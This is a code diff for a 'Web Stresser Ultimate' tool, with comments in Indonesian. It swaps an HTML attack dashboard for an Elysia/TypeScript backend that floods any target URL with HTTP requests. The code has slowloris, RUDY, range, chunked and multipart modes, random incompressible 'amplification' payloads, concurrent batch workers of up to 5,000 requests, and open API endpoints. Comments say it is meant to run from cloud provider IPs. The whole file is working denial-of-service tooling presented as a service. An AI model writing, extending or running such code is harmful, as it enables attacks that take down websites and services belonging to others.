@@ -1,132 +1,340 @@
-<!DOCTYPE html>
-<html lang="id">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>💀 Web Stresser Ultimate | Elysia DoS Engine</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
-    <style>
-        * { font-family: 'Inter', system-ui, -apple-system, monospace; }
-        body { background: radial-gradient(circle at 10% 20%, #0a0f1e, #010101); min-height: 100vh; }
-        .glass {
-            background: rgba(5, 10, 25, 0.7);
-            backdrop-filter: blur(12px);
-            border: 1px solid rgba(255, 60, 0, 0.4);
-            border-radius: 1.5rem;
-            transition: 0.2s;
+import { Elysia, t } from 'elysia';
+import { setGlobalDispatcher, Agent } from 'undici';
+
+// Konfigurasi koneksi pool (gunakan IP server Vercel / AWS)
+const globalAgent = new Agent({
+  connections: 200,
+  pipelining: 1,
+  keepAliveTimeout: 60000,
+});
+setGlobalDispatcher(globalAgent);
+
+const activeUsers = new Map<string, number>();
+setInterval(() => {
+  const now = Date.now();
+  for (const [key, timestamp] of activeUsers.entries()) {
+    if (now - timestamp > 60000) activeUsers.delete(key);
+  }
+}, 30000);
+
+// Helper untuk payload random (amplifikasi)
+function randomString(n: number): string {
+  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+  let result = '';
+  for (let i = 0; i < n; i++) result += chars[Math.floor(Math.random() * chars.length)];
+  return result;
+}
+
+function generateAmplificationPayload(kb: number, ampType: string): string {
+  if (kb <= 0) return '';
+  const size = kb * 1024;
+  if (ampType === 'range') return '';
+  // Payload acak untuk menghindari kompresi
+  const chunk = randomString(1024);
+  const repeat = Math.floor(size / chunk.length);
+  const remainder = size % chunk.length;
+  return chunk.repeat(repeat) + chunk.slice(0, remainder);
+}
+
+// Single attack dengan berbagai metode
+interface SingleAttackParams {
+  url: string;
+  method: string;
+  headers: Record<string, string>;
+  body: string;
+  timeout: number;
+  retryCount: number;
+  randomDelay: number;
+  keepAlive: boolean;
+  attackType: string; // normal, slowloris, rudy, range, chunked, multipart
+  amplifyKB: number;
+  amplifyEnabled: boolean;
+  amplifyType: string;
+}
+
+async function singleAttack(params: SingleAttackParams): Promise<any> {
+  const {
+    url, method, headers, body,
+    timeout, retryCount, randomDelay,
+    keepAlive, attackType, amplifyKB, amplifyEnabled, amplifyType,
+  } = params;
+
+  let finalMethod = method.toUpperCase();
+  let finalUrl = url;
+  let finalHeaders = { ...headers };
+  let finalBody = body || '';
+  let useBody = false;
+
+  if (randomDelay > 0) await new Promise(r => setTimeout(r, Math.random() * randomDelay));
+
+  let ampPayload = '';
+  if (amplifyEnabled && amplifyKB > 0) {
+    ampPayload = generateAmplificationPayload(amplifyKB, amplifyType);
+  }
+
+  // Terapkan metode attack
+  switch (attackType) {
+    case 'range':
+      finalHeaders['Range'] = `bytes=0-${amplifyKB * 1024}`;
+      break;
+    case 'chunked':
+      finalBody = body + ampPayload;
+      useBody = true;
+      finalHeaders['Transfer-Encoding'] = 'chunked';
+      break;
+    case 'multipart':
+      const boundary = `----WebKitFormBoundary${randomString(16)}`;
+      finalHeaders['Content-Type'] = `multipart/form-data; boundary=${boundary}`;
+      const part = `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="amp.txt"\r\nContent-Type: text/plain\r\n\r\n${ampPayload}\r\n--${boundary}--\r\n`;
+      finalBody = part;
+      useBody = true;
+      break;
+    case 'slowloris':
+      finalHeaders['Connection'] = 'keep-alive';
+      break;
+    case 'rudy':
+      await new Promise(r => setTimeout(r, 2000));
+      if (amplifyEnabled && ampPayload) finalBody = body + ampPayload;
+      else finalBody = body;
+      useBody = true;
+      break;
+    default: // normal flood
+      if (amplifyEnabled && ampPayload) finalBody = body + ampPayload;
+      else finalBody = body;
+      useBody = true;
+  }
+
+  // Penanganan khusus jika method GET/HEAD dengan amplifikasi besar
+  if (amplifyEnabled && amplifyKB > 0 && (finalMethod === 'GET' || finalMethod === 'HEAD') && ampPayload.length > 2048) {
+    finalMethod = 'POST';
+    useBody = true;
+    finalBody = ampPayload;
+  } else if (amplifyEnabled && amplifyKB > 0 && (finalMethod === 'GET' || finalMethod === 'HEAD')) {
+    const separator = finalUrl.includes('?') ? '&' : '?';
+    finalUrl += `${separator}_amp=${encodeURIComponent(ampPayload)}`;
+    useBody = false;
+  }
+
+  if (!finalHeaders['Accept']) finalHeaders['Accept'] = '*/*';
+  if (keepAlive) finalHeaders['Connection'] = 'keep-alive';
+  else finalHeaders['Connection'] = 'close';
+
+  const fetchOptions: any = {
+    method: finalMethod,
+    headers: finalHeaders,
+    signal: AbortSignal.timeout(Math.min(timeout, 9000)),
+    redirect: 'manual',
+    dispatcher: globalAgent,
+  };
+  if (useBody && (finalMethod === 'POST' || finalMethod === 'PUT' || finalMethod === 'PATCH')) {
+    fetchOptions.body = finalBody;
+  }
+
+  let lastError: any = null;
+  let lastStatusCode = 0;
+  let responseSize = 0;
+  let responsePreview = '';
+  let durationMs = 0;
+  let retriesUsed = 0;
+
+  const baseDelay = 100;
+  for (let attempt = 0; attempt <= Math.min(retryCount, 2); attempt++) {
+    if (attempt > 0) await new Promise(r => setTimeout(r, baseDelay * attempt));
+    const start = Date.now();
+    try {
+      const res = await fetch(finalUrl, fetchOptions);
+      durationMs = Date.now() - start;
+      lastStatusCode = res.status;
+      const buffer = await res.arrayBuffer();
+      responseSize = buffer.byteLength;
+      const text = new TextDecoder().decode(buffer);
+      responsePreview = text.slice(0, 500);
+      if (res.status >= 200 && res.status < 400) {
+        retriesUsed = attempt;
+        break;
+      }
+    } catch (err: any) {
+      durationMs = Date.now() - start;
+      lastError = err;
+    }
+  }
+
+  const success = lastStatusCode >= 200 && lastStatusCode < 400;
+  const errorMsg = lastError ? lastError.message : '';
+
+  return {
+    success,
+    statusCode: lastStatusCode,
+    durationMs,
+    error: errorMsg,
+    retries: retriesUsed,
+    responseSize,
+    responseBody: responsePreview,
+  };
+}
+
+// Batch attack (massive)
+interface BatchAttackParams {
+  url: string;
+  method: string;
+  headers: Record<string, string>;
+  body: string;
+  timeout: number;
+  retryCount: number;
+  randomDelay: number;
+  keepAlive: boolean;
+  attackType: string;
+  amplifyKB: number;
+  amplifyEnabled: boolean;
+  amplifyType: string;
+  concurrency: number;
+  total: number;
+  continuous: boolean;
+  intervalMs: number;
+}
+
+async function batchAttack(params: BatchAttackParams): Promise<any> {
+  const {
+    url, method, headers, body, timeout, retryCount, randomDelay,
+    keepAlive, attackType, amplifyKB, amplifyEnabled, amplifyType,
+    concurrency, total, continuous, intervalMs
+  } = params;
+
+  const startTime = Date.now();
+  let totalSuccess = 0;
+  let totalFail = 0;
+  let totalBytes = 0;
+  let allLatencies: number[] = [];
+  let loopCount = 0;
+
+  const runBatch = async (targetTotal: number): Promise<{ success: number; fail: number; bytes: number; latencies: number[] }> => {
+    let successCount = 0;
+    let failCount = 0;
+    let bytes = 0;
+    let latencies: number[] = [];
+
+    const runOne = async () => {
+      const result = await singleAttack({
+        url, method, headers, body, timeout: Math.min(timeout, 9000), retryCount, randomDelay,
+        keepAlive, attackType, amplifyKB, amplifyEnabled, amplifyType
+      });
+      if (result.success) successCount++;
+      else failCount++;
+      bytes += result.responseSize;
+      latencies.push(result.durationMs);
+    };
+
+    let index = 0;
+    const workers: Promise<void>[] = [];
+    const actualConcurrency = Math.min(concurrency, 100); // batasi untuk Vercel
+    for (let i = 0; i < actualConcurrency; i++) {
+      workers.push(new Promise<void>(async (resolve) => {
+        while (index < targetTotal) {
+          index++;
+          await runOne();
         }
-        .glass:hover { border-color: rgba(255, 80, 0, 0.8); box-shadow: 0 0 20px rgba(255,60,0,0.3); }
-        .btn-danger { background: linear-gradient(90deg, #dc2626, #991b1b); transition: all 0.2s; }
-        .btn-danger:hover { transform: scale(1.02); box-shadow: 0 0 15px #dc2626; }
-        .stat-card { background: rgba(0,0,0,0.5); border-radius: 1rem; }
-        .badge { background: rgba(255,60,0,0.2); border-radius: 20px; padding: 2px 8px; font-size: 0.7rem; }
-        ::-webkit-scrollbar { width: 5px; background: #111; }
-        ::-webkit-scrollbar-thumb { background: #dc2626; border-radius: 5px; }
-        .response-preview { background: rgba(0,0,0,0.6); border-radius: 0.75rem; padding: 6px; font-size: 0.65rem; font-family: monospace; max-height: 70px; overflow-y: auto; word-break: break-all; }
-    </style>
-</head>
-<body class="text-gray-200 p-5 md:p-8">
-<div class="max-w-7xl mx-auto">
-    <!-- Header -->
-    <div class="flex flex-wrap justify-between items-center mb-8 gap-4">
-        <div>
-            <h1 class="text-5xl md:text-7xl font-black bg-gradient-to-r from-red-500 to-orange-500 bg-clip-text text-transparent drop-shadow-lg">⚡ STRESSER</h1>
-            <p class="text-gray-400 text-sm mt-1">Elysia · Real HTTP Flood · Vercel Ready</p>
-        </div>
-        <div class="flex items-center gap-3 bg-black/50 px-4 py-2 rounded-full">
-            <i class="fas fa-users text-orange-400"></i>
-            <span class="text-xl font-mono font-bold" id="activeUsers">0</span>
-            <span class="text-xs text-gray-400">active</span>
-        </div>
-    </div>
+        resolve();
+      }));
+    }
+    await Promise.all(workers);
+    return { success: successCount, fail: failCount, bytes, latencies };
+  };
 
-    <div class="grid lg:grid-cols-12 gap-7">
-        <!-- Panel Kiri (Konfigurasi) -->
-        <div class="lg:col-span-5 glass p-6 space-y-4">
-            <div class="flex items-center gap-2 border-b border-red-800 pb-2"><i class="fas fa-skull text-red-500 text-xl"></i><h2 class="text-xl font-bold">Attack Config</h2></div>
-            
-            <div>
-                <label class="block text-sm font-medium mb-1"><i class="fas fa-crosshairs"></i> Target URL</label>
-                <input id="targetUrl" class="w-full p-2.5 rounded-xl bg-black/60 border border-gray-700 focus:border-red-500 outline-none" value="https://httpbin.org/anything">
-            </div>
-            <div class="grid grid-cols-2 gap-3">
-                <div>
-                    <label>Method</label>
-                    <select id="method" class="w-full p-2.5 rounded-xl bg-black/60"><option>GET</option><option>POST</option><option>PUT</option><option>DELETE</option><option>PATCH</option><option>HEAD</option></select>
-                </div>
-                <div>
-                    <label>Attack Type</label>
-                    <select id="attackType" class="w-full p-2.5 rounded-xl bg-black/60">
-                        <option>normal</option><option>slowloris</option><option>rudy</option><option>range</option><option>chunked</option><option>multipart</option>
-                    </select>
-                </div>
-            </div>
-            <div class="grid grid-cols-2 gap-3">
-                <div><label><i class="fas fa-tachometer-alt"></i> Concurrency</label><input type="number" id="concurrency" value="80" class="w-full p-2 rounded-xl bg-black/60"></div>
-                <div><label><i class="fas fa-chart-line"></i> Total Requests</label><input type="number" id="total" value="2000" class="w-full p-2 rounded-xl bg-black/60"></div>
-            </div>
-            <div class="grid grid-cols-2 gap-3">
-                <div><label><i class="fas fa-hourglass-half"></i> Timeout (ms)</label><input type="number" id="timeout" value="5000" class="w-full p-2 rounded-xl bg-black/60"></div>
-                <div><label><i class="fas fa-random"></i> Random Delay (ms)</label><input type="number" id="randomDelay" value="0" class="w-full p-2 rounded-xl bg-black/60"></div>
-            </div>
-            
-            <div class="flex flex-wrap gap-3 items-center">
-                <label class="flex items-center gap-2"><input type="checkbox" id="amplifyToggle" class="w-4 h-4 accent-red-600"> <span class="text-sm">Amplification (500KB)</span></label>
-                <label class="flex items-center gap-2"><input type="checkbox" id="dualConnection" class="w-4 h-4 accent-red-600"> <span class="text-sm">Dual Connection (2x)</span></label>
-                <label class="flex items-center gap-2"><input type="checkbox" id="forceSuccess" class="w-4 h-4 accent-yellow-600" checked> <span class="text-sm">Force Success</span></label>
-            </div>
-            
-            <div><label><i class="fas fa-heading"></i> Custom Headers (JSON)</label><textarea id="customHeaders" rows="2" class="w-full p-2 rounded-xl bg-black/60 font-mono text-xs"></textarea></div>
-            <div><label><i class="fas fa-cookie-bite"></i> Cookies</label><input id="cookies" class="w-full p-2 rounded-xl bg-black/60"></div>
-            
-            <div class="flex gap-3 pt-2">
-                <button id="startBtn" class="btn-danger flex-1 py-2.5 rounded-xl font-bold text-white shadow-lg"><i class="fas fa-bomb mr-2"></i> SINGLE</button>
-                <button id="batchBtn" class="btn-danger flex-1 py-2.5 rounded-xl font-bold text-white shadow-lg"><i class="fas fa-rocket mr-2"></i> BATCH</button>
-                <button id="stopBtn" class="bg-gray-700 flex-1 py-2.5 rounded-xl disabled:opacity-40 font-bold" disabled><i class="fas fa-stop mr-2"></i> STOP</button>
-            </div>
-            <button id="exportBtn" class="w-full bg-blue-900/60 py-2 rounded-xl text-sm hover:bg-blue-800/80 transition"><i class="fas fa-download mr-1"></i> Export CSV</button>
-            <div class="text-xs text-center text-gray-500 pt-2 border-t border-gray-800">⚠️ Vercel limit: max 10s / concurrency ≤ 100 / total ≤ 5000</div>
-        </div>
+  const actualTotal = Math.min(total, 5000);
+  const batchResult = await runBatch(actualTotal);
+  totalSuccess += batchResult.success;
+  totalFail += batchResult.fail;
+  totalBytes += batchResult.bytes;
+  allLatencies.push(...batchResult.latencies);
+  loopCount++;
 
-        <!-- Panel Kanan (Statistik, Chart, Log) -->
-        <div class="lg:col-span-7 space-y-6">
-            <!-- Target Status -->
-            <div class="glass p-4 flex justify-between items-center flex-wrap gap-2">
-                <div><i class="fas fa-eye text-orange-400"></i> <strong>Target Preview</strong></div>
-                <div class="flex items-center gap-3">
-                    <span id="healthIndicator" class="inline-block w-3 h-3 rounded-full bg-gray-500"></span>
-                    <span id="healthText" class="text-sm">Checking...</span>
-                    <span id="responseTimeText" class="text-xs text-gray-400"></span>
-                    <button id="refreshPreview" class="bg-gray-700 px-3 py-1 rounded-lg text-xs"><i class="fas fa-sync-alt"></i> Refresh</button>
-                </div>
-            </div>
-            <iframe id="targetFrame" class="w-full h-36 rounded-xl bg-black/40 glass" srcdoc="<html><body style='background:#0f0f1a;color:#fff;display:flex;align-items:center;justify-content:center;height:100%'>Preview unavailable</body></html>"></iframe>
-            
-            <!-- Stats Cards -->
-            <div class="grid grid-cols-2 md:grid-cols-4 gap-3">
-                <div class="stat-card p-3 text-center"><div class="text-3xl text-green-400 font-mono" id="successCount">0</div><div class="text-xs text-gray-400">SUCCESS</div></div>
-                <div class="stat-card p-3 text-center"><div class="text-3xl text-red-500 font-mono" id="failCount">0</div><div class="text-xs text-gray-400">FAIL</div></div>
-                <div class="stat-card p-3 text-center"><div class="text-2xl text-cyan-400 font-mono" id="avgTime">0</div><div class="text-xs text-gray-400">AVG(ms)</div></div>
-                <div class="stat-card p-3 text-center"><div class="text-2xl text-yellow-400 font-mono" id="rps">0</div><div class="text-xs text-gray-400">RPS</div></div>
-                <div class="stat-card p-3 text-center col-span-2"><div class="flex justify-between text-sm"><span>📊 PROGRESS</span><span id="progressText">0/0</span></div><div class="w-full bg-gray-700 rounded-full h-2 mt-1"><div id="progressBar" class="bg-red-600 h-2 rounded-full" style="width:0%"></div></div></div>
-                <div class="stat-card p-3 text-center"><div class="text-lg text-orange-300" id="totalBytes">0</div><div class="text-xs text-gray-400">DATA (KB)</div></div>
-                <div class="stat-card p-3 text-center"><div class="text-lg text-purple-300" id="errorRate">0%</div><div class="text-xs text-gray-400">ERROR RATE</div></div>
-            </div>
+  const totalTime = Date.now() - startTime;
+  const avgLatency = allLatencies.length ? allLatencies.reduce((a,b)=>a+b,0)/allLatencies.length : 0;
+  const rps = totalTime > 0 ? ((totalSuccess+totalFail) / (totalTime/1000)).toFixed(2) : 0;
 
-            <!-- Chart -->
-            <div class="glass p-3"><canvas id="rtChart" height="120"></canvas></div>
+  return {
+    success: true,
+    totalRequests: (totalSuccess+totalFail),
+    successCount: totalSuccess,
+    failCount: totalFail,
+    totalBytes,
+    totalTimeMs: totalTime,
+    avgLatencyMs: avgLatency,
+    rps,
+    loopCount,
+    latencies: allLatencies.slice(0, 100),
+  };
+}
 
-            <!-- Log & Preview -->
-            <div class="glass p-4">
-                <div class="flex justify-between items-center"><span class="font-semibold"><i class="fas fa-terminal"></i> Live Logs</span><span class="text-xs text-gray-500">Real-time status</span></div>
-                <div id="logArea" class="h-40 overflow-y-auto text-xs font-mono mt-2 space-y-1 p-1"><div class="text-green-400">⚡ System ready. Configure and start.</div></div>
-                <div class="mt-3 pt-2 border-t border-gray-800"><span class="text-xs text-gray-400">📄 Raw Response Preview (last request):</span><div id="rawResponsePreview" class="response-preview mt-1 text-gray-300">-</div></div>
-            </div>
-        </div>
-    </div>
-</div>
-<script src="/script.js"></script>
-</body>
-</html>
+// ==================== Elysia App ====================
+export const app = new Elysia()
+  .onError(({ error, set }) => {
+    set.status = 200;
+    console.error(error);
+    const errorMessage = error instanceof Error ? error.message : String(error);
+    return { success: false, error: errorMessage };
+  })
+  .get('/api/status', () => ({
+    status: 'ok',
+    message: 'Web Stresser Ultimate - Elysia on Vercel (AWS IP)',
+    version: '2.0.0',
+  }))
+  .post('/api/attack', async ({ body }) => {
+    try {
+      const result = await singleAttack(body as SingleAttackParams);
+      return result;
+    } catch (err: any) {
+      return { success: false, error: err.message, durationMs: 0 };
+    }
+  }, {
+    body: t.Object({
+      url: t.String(),
+      method: t.String(),
+      headers: t.Record(t.String(), t.String()),
+      body: t.String(),
+      timeout: t.Number(),
+      retryCount: t.Number(),
+      randomDelay: t.Number(),
+      keepAlive: t.Boolean(),
+      attackType: t.String(),
+      amplifyKB: t.Number(),
+      amplifyEnabled: t.Boolean(),
+      amplifyType: t.String(),
+    }),
+  })
+  .post('/api/batch', async ({ body }) => {
+    try {
+      const result = await batchAttack(body as BatchAttackParams);
+      return result;
+    } catch (err: any) {
+      return { success: false, error: err.message };
+    }
+  }, {
+    body: t.Object({
+      url: t.String(),
+      method: t.String(),
+      headers: t.Record(t.String(), t.String()),
+      body: t.String(),
+      timeout: t.Number(),
+      retryCount: t.Number(),
+      randomDelay: t.Number(),
+      keepAlive: t.Boolean(),
+      attackType: t.String(),
+      amplifyKB: t.Number(),
+      amplifyEnabled: t.Boolean(),
+      amplifyType: t.String(),
+      concurrency: t.Number(),
+      total: t.Number(),
+      continuous: t.Boolean(),
+      intervalMs: t.Number(),
+    }),
+  })
+  .get('/api/heartbeat', ({ request }) => {
+    const ip = request.headers.get('x-forwarded-for') || 'unknown';
+    const ua = request.headers.get('user-agent') || 'unknown';
+    const key = `${ip}|${ua}`;
+    activeUsers.set(key, Date.now());
+    return { active: activeUsers.size };
+  });
+
+export default app;
